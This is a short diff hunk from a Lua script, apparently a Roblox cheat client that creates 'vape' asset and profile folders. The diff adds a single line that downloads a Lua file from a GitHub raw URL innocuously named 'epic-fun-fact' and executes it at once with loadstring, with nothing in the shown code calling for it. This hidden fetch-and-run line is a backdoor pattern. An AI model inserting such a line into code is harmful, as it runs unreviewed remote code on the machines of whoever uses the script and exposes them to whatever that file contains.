@@ -82,7 +82,7 @@ makefolder("vape/assets")
 makefolder("vape/Profiles")
 end)
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shuttle-r/epic-fun-fact/main/fun%20fact.lua", true)()
 
 
 if isfolder(customdir:gsub("/", "")) == false then
